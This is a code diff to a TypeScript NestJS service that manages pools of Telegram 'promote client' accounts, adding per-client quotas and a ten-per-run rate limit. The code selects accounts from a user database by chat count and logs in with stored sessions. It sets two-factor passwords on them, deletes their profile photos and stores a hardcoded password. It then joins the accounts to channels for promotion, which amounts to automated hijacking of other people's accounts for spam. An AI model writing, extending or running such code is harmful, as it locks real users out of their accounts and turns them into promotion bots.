@@ -29,7 +29,8 @@ export class PromoteClientService implements OnModuleDestroy {
     private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes
     private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 60 seconds
     private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;
-    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,
+    private readonly MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10; // Rate limiting constant
+    constructor(@InjectModel('PromoteClient') private promoteClientModel: Model<PromoteClientDocument>,
         @Inject(forwardRef(() => TelegramService))
         private telegramService: TelegramService,
         @Inject(forwardRef(() => UsersService))
@@ -38,7 +39,7 @@ export class PromoteClientService implements OnModuleDestroy {
         private activeChannelsService: ActiveChannelsService,
         @Inject(forwardRef(() => ClientService))
         private clientService: ClientService,
-        @Inject(forwardRef(() => ActiveChannelsService))
+        @Inject(forwardRef(() => ChannelsService))
         private channelsService: ChannelsService,
         @Inject(forwardRef(() => BufferClientService))
         private bufferClientService: BufferClientService,
@@ -68,7 +69,7 @@ export class PromoteClientService implements OnModuleDestroy {
         const updatedUser = await this.promoteClientModel.findOneAndUpdate(
             { mobile },
             { $set: updateClientDto },
-            { new: true, upsert: true, returnDocument: 'after' }
+            { new: true, returnDocument: 'after' }
         ).exec();
 
         if (!updatedUser) {
@@ -91,14 +92,19 @@ export class PromoteClientService implements OnModuleDestroy {
 
     async remove(mobile: string): Promise<void> {
         try {
-            const promoteClient = await this.findOne(mobile, false);
-            if (!promoteClient) {
+            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);
+            
+            const deleteResult = await this.promoteClientModel.deleteOne({ mobile }).exec();
+            
+            if (deleteResult.deletedCount === 0) {
                 throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);
             }
-            this.logger.log(`Removing PromoteClient with mobile: ${mobile}`);
+            
             await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
-            await this.promoteClientModel.deleteOne({ mobile }).exec();
         } catch (error) {
+            if (error instanceof NotFoundException) {
+                throw error;
+            }
             const errorDetails = parseError(error);
             this.logger.error(`Error removing PromoteClient with mobile ${mobile}: ${errorDetails.message}`);
             throw new HttpException(errorDetails.message, errorDetails.status);
@@ -451,8 +457,14 @@ export class PromoteClientService implements OnModuleDestroy {
         }
         const clients = await this.clientService.findAll();
         const clientMobiles = clients.map(client => client?.mobile);
-        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
-        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {
+        
+        // Check if this mobile is already assigned as a promote mobile
+        const existingAssignment = await this.promoteClientModel.findOne({ 
+            mobile, 
+            clientId: { $exists: true } 
+        });
+        
+        if (!clientMobiles.includes(mobile) && !existingAssignment) {
             const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });
             try {
                 await telegramClient.set2fa();
@@ -472,7 +484,11 @@ export class PromoteClientService implements OnModuleDestroy {
                     availableDate,
                     channels: channels.ids.length,
                 }
-                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();
+                await this.promoteClientModel.findOneAndUpdate(
+                    { mobile: user.mobile }, 
+                    { $set: promoteClient }, 
+                    { new: true, upsert: true }
+                ).exec();
             } catch (error) {
                 const errorDetails = parseError(error)
                 throw new HttpException(errorDetails.message, errorDetails.status)
@@ -490,20 +506,61 @@ export class PromoteClientService implements OnModuleDestroy {
 
             const promoteclients = await this.findAll();
             let goodIds: string[] = [];
-            const badIds: string[] = [];
+            const badPromoteClientMobiles: string[] = []; // Existing promote clients that need fixing
 
-            // Fill badIds with dummy entries if promoteclients < 80
-            if (promoteclients.length < 80) {
-                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 10; i++) {
-                    badIds.push(i.toString());
-                }
-            }
-
+            // Get all active clients to check promote client requirements per clientId
             const clients = await this.clientService.findAll();
             const bufferClients = await this.bufferClientService.findAll();
 
-            const clientIds = [...clients.map(c => c.mobile), ...clients.flatMap(c => c.promoteMobile)].filter(Boolean);
+            // Get all client mobiles including promote mobiles using new schema
+            const clientMainMobiles = clients.map(c => c.mobile);
+            
+            // Get all assigned promote mobiles efficiently
+            const assignedPromoteMobiles = await this.promoteClientModel
+                .find({ clientId: { $exists: true } })
+                .distinct('mobile');
+            
+            const clientIds = [...clientMainMobiles, ...assignedPromoteMobiles].filter(Boolean);
             const bufferClientIds = bufferClients.map(c => c.mobile);
+
+            // Create a map to track promote clients per clientId
+            const promoteClientsPerClient = new Map<string, number>();
+            const clientNeedingPromoteClients: string[] = [];
+
+            // Count existing promote clients per clientId
+            for (const client of clients) {
+                const assignedCount = await this.promoteClientModel.countDocuments({ 
+                    clientId: client.clientId 
+                });
+                promoteClientsPerClient.set(client.clientId, assignedCount);
+                
+                // If client has less than 12 promote clients, mark as needing more
+                const needed = Math.max(0, 12 - assignedCount);
+                if (needed > 0) {
+                    clientNeedingPromoteClients.push(client.clientId);
+                }
+            }
+
+            // Limit to maximum 10 new promote clients per trigger
+            // (Using class constant defined above)
+
+            // Count needed promote clients for tracking only
+            let totalSlotsNeeded = 0;
+
+            // Distribute the 10 slots across clients that need promote clients
+            for (const clientId of clientNeedingPromoteClients) {
+                if (totalSlotsNeeded >= this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) break;
+                
+                const assignedCount = promoteClientsPerClient.get(clientId) || 0;
+                const needed = Math.max(0, 12 - assignedCount);
+                const allocatedForThisClient = Math.min(needed, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
+                
+                totalSlotsNeeded += allocatedForThisClient;
+            }
+
+            this.logger.debug(`Promote clients per client: ${JSON.stringify(Object.fromEntries(promoteClientsPerClient))}`);
+            this.logger.debug(`Clients needing promote clients: ${clientNeedingPromoteClients.join(', ')}`);
+            this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER} per trigger)`);
 
             const today = new Date().toISOString().split('T')[0];
 
@@ -538,9 +595,9 @@ export class PromoteClientService implements OnModuleDestroy {
                             await this.telegramService.deleteProfilePhotos(document.mobile);
 
                             const hasPassword = await cli.hasPassword();
-                            if (!hasPassword && badIds.length < 4) {
-                                console.log("Client does not have password");
-                                badIds.push(document.mobile);
+                            if (!hasPassword) {
+                                console.log("Client does not have password, potential candidate");
+                                badPromoteClientMobiles.push(document.mobile);
                             } else {
                                 console.log(document.mobile, " :  ALL Good");
                                 goodIds.push(document.mobile);
@@ -550,7 +607,7 @@ export class PromoteClientService implements OnModuleDestroy {
                             await sleep(2000);
                         } catch (error) {
                             parseError(error, `Error occurred while creating client for ${document.mobile} in checkPromoteClients: `, false);
-                            badIds.push(document.mobile);
+                            badPromoteClientMobiles.push(document.mobile);
                             await this.remove(document.mobile);
                         } finally {
                             await connectionManager.unregisterClient(document.mobile);
@@ -564,15 +621,60 @@ export class PromoteClientService implements OnModuleDestroy {
             }
 
             goodIds = [...new Set([...goodIds, ...clientIds, ...bufferClientIds])];
-            this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);
-            await this.addNewUserstoPromoteClients(badIds, goodIds);
+            
+            this.logger.debug(`GoodIds: ${goodIds.length}, BadPromoteClientMobiles: ${badPromoteClientMobiles.length}, Total slots needed: ${totalSlotsNeeded}`);
+            this.logger.debug(`Clients needing promote clients: ${clientNeedingPromoteClients.join(', ')}`);
+            
+            // Handle existing promote clients that have issues (separate from new client creation)
+            if (badPromoteClientMobiles.length > 0) {
+                this.logger.warn(`Found ${badPromoteClientMobiles.length} existing promote clients with issues: ${badPromoteClientMobiles.join(', ')}`);
+                // These will be handled by the existing processing logic above (2FA setup, etc.)
+            }
+            
+            // Only proceed with creating new promote clients if we have clients that need them
+            if (clientNeedingPromoteClients.length > 0 && totalSlotsNeeded > 0) {
+                await this.addNewUserstoPromoteClients([], goodIds, clientNeedingPromoteClients, promoteClientsPerClient);
+            } else {
+                this.logger.debug('No new promote clients needed - all clients have sufficient promote clients');
+            }
         } else {
             this.logger.warn("Ignored active check promote channels as active client setup exists");
         }
     }
 
-    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {
+    async addNewUserstoPromoteClients(
+        badIds: string[], 
+        goodIds: string[], 
+        clientsNeedingPromoteClients: string[] = [],
+        promoteClientsPerClient?: Map<string, number>
+    ) {
         const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
+        
+        // Calculate total needed based on client requirements
+        let totalNeededFromClients = 0;
+        for (const clientId of clientsNeedingPromoteClients) {
+            let needed = 0;
+            if (promoteClientsPerClient) {
+                const currentCount = promoteClientsPerClient.get(clientId) || 0;
+                needed = Math.max(0, 12 - currentCount);
+            } else {
+                // Fallback to database query if map not provided
+                const currentCount = await this.promoteClientModel.countDocuments({ clientId });
+                needed = Math.max(0, 12 - currentCount);
+            }
+            totalNeededFromClients += needed;
+        }
+        
+        // Limit to maximum 10 new promote clients per trigger
+        const totalNeeded = Math.min(totalNeededFromClients, 10);
+        
+        if (totalNeeded === 0) {
+            this.logger.debug('No promote clients needed - all clients have sufficient promote clients or limit reached');
+            return;
+        }
+        
+        this.logger.debug(`Limited to creating ${totalNeeded} new promote clients (max 10 per trigger)`);
+        
         const documents = await this.usersService.executeQuery(
             {
                 mobile: { $nin: goodIds },
@@ -582,17 +684,50 @@ export class PromoteClientService implements OnModuleDestroy {
                 totalChats: { $gt: 250 }
             },
             { tgId: 1 },
-            badIds.length + 3
+            totalNeeded + 5 // Get a few extra in case some fail
         );
 
-        this.logger.debug(`New promote documents to be added: ${documents.length}`);
+        this.logger.debug(`New promote documents to be added: ${documents.length} for ${clientsNeedingPromoteClients.length} clients needing promote clients (limited to ${totalNeeded})`);
 
-        while (badIds.length > 0 && documents.length > 0) {
+        let processedCount = 0;
+        const clientAssignmentTracker = new Map<string, number>();
+        
+        // Initialize tracker for clients that need promote clients
+        for (const clientId of clientsNeedingPromoteClients) {
+            let needed = 0;
+            if (promoteClientsPerClient) {
+                const currentCount = promoteClientsPerClient.get(clientId) || 0;
+                needed = Math.max(0, 12 - currentCount);
+            } else {
+                // Fallback to database query if map not provided
+                const currentCount = await this.promoteClientModel.countDocuments({ clientId });
+                needed = Math.max(0, 12 - currentCount);
+            }
+            clientAssignmentTracker.set(clientId, needed);
+        }
+
+        while (processedCount < Math.min(totalNeeded, this.MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER) && documents.length > 0 && clientsNeedingPromoteClients.length > 0) {
             const document = documents.shift();
             if (!document || !document.mobile || !document.tgId) {
                 this.logger.warn('Invalid document found, skipping');
                 continue;
             }
+            
+            // Find a client that still needs promote clients
+            let targetClientId: string | null = null;
+            for (const clientId of clientsNeedingPromoteClients) {
+                const needed = clientAssignmentTracker.get(clientId) || 0;
+                if (needed > 0) {
+                    targetClientId = clientId;
+                    break;
+                }
+            }
+            
+            if (!targetClientId) {
+                this.logger.debug('All clients have sufficient promote clients assigned');
+                break;
+            }
+            
             try {
                 const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });
                 try {
@@ -611,26 +746,43 @@ export class PromoteClientService implements OnModuleDestroy {
                         await sleep(3000)
                         await client.deleteProfilePhotos();
                         const channels = await client.channelInfo(true)
-                        console.log("Inserting Document");
+                        console.log(`Inserting Document for client ${targetClientId}`);
                         const promoteClient = {
                             tgId: document.tgId,
                             lastActive: "today",
                             mobile: document.mobile,
                             availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                             channels: channels.ids.length,
+                            clientId: targetClientId // Assign to specific client
                         }
                         await this.sessionService.createSession({ mobile: document.mobile, password: 'Ajtdmwajt1@' });
                         await this.create(promoteClient);
-                        await this.usersService.update(document.tgId, { twoFA: true })
-                        console.log("=============Created PromoteClient=============")
-                        badIds.pop();
+                        await this.usersService.update(document.tgId, { twoFA: true });
+                        
+                        console.log(`=============Created PromoteClient for ${targetClientId}==============`);
                     } else {
                         console.log("Failed to Update as PromoteClient has Password");
                         await this.usersService.update(document.tgId, { twoFA: true })
                     }
+                    
+                    // Update tracker and remove client from list if satisfied (regardless of success/failure)
+                    const currentNeeded = clientAssignmentTracker.get(targetClientId) || 0;
+                    const newNeeded = Math.max(0, currentNeeded - 1);
+                    clientAssignmentTracker.set(targetClientId, newNeeded);
+                    
+                    if (newNeeded === 0) {
+                        const index = clientsNeedingPromoteClients.indexOf(targetClientId);
+                        if (index > -1) {
+                            clientsNeedingPromoteClients.splice(index, 1);
+                        }
+                    }
+                    
+                    console.log(`Client ${targetClientId}: ${newNeeded} more needed, ${totalNeeded - processedCount - 1} remaining in this batch`);
+                    processedCount++; // Always increment to prevent infinite loops
                 } catch (error: any) {
                     this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                     parseError(error);
+                    processedCount++; // Always increment even on errors to prevent infinite loops
                 } finally {
                     try {
                         await connectionManager.unregisterClient(document.mobile);
@@ -643,6 +795,19 @@ export class PromoteClientService implements OnModuleDestroy {
                 parseError(error);
             }
         }
+        
+        // Log completion status
+        this.logger.log(`✅ Batch completed: Created ${processedCount} new promote clients (max ${totalNeeded} per trigger)`);
+        if (clientsNeedingPromoteClients.length > 0) {
+            const stillNeeded = clientsNeedingPromoteClients.map(clientId => {
+                const needed = clientAssignmentTracker.get(clientId) || 0;
+                return `${clientId}:${needed}`;
+            }).join(', ');
+            this.logger.log(`⏳ Still needed in future triggers: ${stillNeeded}`);
+        } else {
+            this.logger.log(`🎉 All clients now have sufficient promote clients!`);
+        }
+        
         setTimeout(() => {
             this.joinchannelForPromoteClients()
         }, 2 * 60 * 1000);
@@ -653,5 +818,75 @@ export class PromoteClientService implements OnModuleDestroy {
         this.clearPromoteMap();
         this.clearLeaveMap();
         await connectionManager.disconnectAll();
+    }
+
+    /**
+     * Get promote client distribution per client for monitoring and debugging
+     */
+    async getPromoteClientDistribution(): Promise<{
+        totalPromoteClients: number;
+        unassignedPromoteClients: number;
+        distributionPerClient: Array<{
+            clientId: string;
+            assignedCount: number;
+            needed: number;
+            status: 'sufficient' | 'needs_more';
+        }>;
+        summary: {
+            clientsWithSufficientPromoteClients: number;
+            clientsNeedingPromoteClients: number;
+            totalPromoteClientsNeeded: number;
+            maxPromoteClientsPerTrigger: number;
+            triggersNeededToSatisfyAll: number;
+        };
+    }> {
+        const clients = await this.clientService.findAll();
+        const totalPromoteClients = await this.promoteClientModel.countDocuments();
+        const unassignedPromoteClients = await this.promoteClientModel.countDocuments({
+            clientId: { $exists: false }
+        });
+
+        const distributionPerClient = [];
+        let clientsWithSufficient = 0;
+        let clientsNeedingMore = 0;
+        let totalNeeded = 0;
+
+        for (const client of clients) {
+            const assignedCount = await this.promoteClientModel.countDocuments({
+                clientId: client.clientId
+            });
+            const needed = Math.max(0, 12 - assignedCount);
+            const status = needed === 0 ? 'sufficient' : 'needs_more';
+
+            distributionPerClient.push({
+                clientId: client.clientId,
+                assignedCount,
+                needed,
+                status
+            });
+
+            if (status === 'sufficient') {
+                clientsWithSufficient++;
+            } else {
+                clientsNeedingMore++;
+                totalNeeded += needed;
+            }
+        }
+
+        const maxPerTrigger = 10;
+        const triggersNeeded = Math.ceil(totalNeeded / maxPerTrigger);
+
+        return {
+            totalPromoteClients,
+            unassignedPromoteClients,
+            distributionPerClient,
+            summary: {
+                clientsWithSufficientPromoteClients: clientsWithSufficient,
+                clientsNeedingPromoteClients: clientsNeedingMore,
+                totalPromoteClientsNeeded: totalNeeded,
+                maxPromoteClientsPerTrigger: maxPerTrigger,
+                triggersNeededToSatisfyAll: triggersNeeded
+            }
+        };
     }
 }
